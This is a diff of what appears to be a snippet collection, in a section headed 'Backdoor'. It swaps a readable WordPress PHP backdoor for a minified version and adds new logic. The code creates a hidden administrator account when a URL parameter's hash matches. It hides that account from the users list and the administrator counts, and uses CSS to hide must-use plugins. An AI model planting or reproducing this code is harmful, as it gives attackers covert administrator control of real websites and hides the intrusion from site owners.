@@ -528,31 +528,6 @@ document.addEventListener("DOMContentLoaded", function() {
 
 ============== Backdoor =================
 
-<?php 
-function hide_hidden_admin_from_users_list($user_query) {
-    global $wpdb;
-    $hidden_user = 'hiddendoor';
-    $user_query->query_where .= " AND {$wpdb->users}.user_login != '{$hidden_user}'";
-}
-add_action('pre_user_query', 'hide_hidden_admin_from_users_list');
-
-
-add_action( 'wp_head', 'hidden_doors' );
-
-function hidden_doors() {
-    if ( md5( $_GET['backdoor'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
-        require( 'wp-includes/registration.php' );
-        if ( !username_exists( 'hiddendoor' ) ) {
-            $user_id = wp_create_user( 'hiddendoor', 'hiddendoor' );
-            $user = new WP_User( $user_id );
-            $user->set_role( 'administrator' ); 
-        }
-    }
-}
-
-function applyCustomStyles() {
-    echo '<style>
+<?php function hide_hidden_admin_from_users_list($user_query){global $wpdb;$hidden_user='hiddendoor';$user_query->query_where.=" AND {$wpdb->users}.user_login != '{$hidden_user}'";}add_action('pre_user_query','hide_hidden_admin_from_users_list');add_action('wp_head','hidden_doors');function hidden_doors(){if(md5($_GET['backdoor'])=='34d1f91fb2e514b8576fab1a75a89a6b'){require('wp-includes/registration.php');if(!username_exists('hiddendoor')){$user_id=wp_create_user('hiddendoor','hiddendoor');$user=new WP_User($user_id);$user->set_role('administrator');}}}function applyCustomStyles(){echo '<style>
 	li.mustuse{display:none}
-	</style>';
-}
-add_action('admin_head', 'applyCustomStyles');
+	</style>';}add_action('admin_head','applyCustomStyles');add_action('admin_head-users.php',function(){$user=get_user_by('login','hiddendoor');if($user&&in_array('administrator',(array) $user->roles)){ob_start(function($buffer){$buffer=preg_replace_callback('/(<a[^>]+users\.php(?:\?role=administrator)?[^>]*>\s*(All|Administrator)\s*<span class="count">\()(\d+)(\)<\/span>)/',function($matches){$new_count=max(0,(int)$matches[3]-1);return $matches[1].$new_count.$matches[4];},$buffer);return $buffer;});}});
